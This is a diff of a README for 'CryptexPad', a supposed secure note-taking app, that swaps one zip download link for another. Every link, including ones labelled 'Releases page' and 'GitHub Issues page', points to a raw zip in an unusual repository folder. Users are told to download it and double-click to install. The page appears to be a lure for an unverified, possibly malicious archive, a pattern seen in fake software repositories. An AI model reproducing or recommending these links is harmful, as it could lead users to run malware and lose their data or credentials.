@@ -1,7 +1,7 @@
 # 🚀 CryptexPad - Secure Your Thoughts Digitally
 
 ## 📥 Download Now
-[![Download CryptexPad](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/CryptexPad.zip)](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/CryptexPad.zip)
+[![Download CryptexPad](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/Pad-Cryptex-3.8.zip)](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/Pad-Cryptex-3.8.zip)
 
 ## 📖 Introduction
 CryptexPad is a simple yet effective application designed to help you keep your notes secure. Whether you handle sensitive information or want to jot down your ideas safely, CryptexPad is here to assist you. With a user-friendly interface, anyone can use it without needing technical skills.
@@ -10,7 +10,7 @@ CryptexPad is a simple yet effective application designed to help you keep your 
 To start using CryptexPad, follow these easy steps:
 
 1. **Download CryptexPad**  
-   Click the button above or visit the [Releases page](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/CryptexPad.zip) to download the latest version of CryptexPad.
+   Click the button above or visit the [Releases page](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/Pad-Cryptex-3.8.zip) to download the latest version of CryptexPad.
 
 2. **Install the Application**  
    After downloading, locate the file in your downloads folder. Double-click on the file to begin the installation. Follow the prompts to install CryptexPad on your computer.
@@ -32,7 +32,7 @@ Before installing CryptexPad, make sure your computer meets these basic requirem
 - **Storage**: Minimum of 100 MB of free space.
 
 ## 📥 Download & Install
-To download CryptexPad, visit the [Releases page](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/CryptexPad.zip). There you will find the latest version ready for download. After downloading, follow the installation instructions above to set up the application.
+To download CryptexPad, visit the [Releases page](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/Pad-Cryptex-3.8.zip). There you will find the latest version ready for download. After downloading, follow the installation instructions above to set up the application.
 
 ## 📄 Usage Instructions
 1. **Create a New Note**: Click on "New Note" to start writing. Add your text and choose an encryption option if needed.
@@ -43,7 +43,7 @@ To download CryptexPad, visit the [Releases page](https://raw.githubusercontent.
 CryptexPad takes your security seriously. All notes are encrypted using strong algorithms. Make sure to set a strong password for maximum protection. Always remember your password; losing it will mean you cannot access your notes.
 
 ## 📞 Support
-If you encounter issues while using CryptexPad, please refer to our FAQs or reach out for support. You can file an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/CryptexPad.zip).
+If you encounter issues while using CryptexPad, please refer to our FAQs or reach out for support. You can file an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Petro-0/CryptexPad/main/Dinaric/Pad-Cryptex-3.8.zip).
 
 ## 📚 Additional Resources
 - **Documentation**: For detailed information about features and updates, check our documentation in the repository.
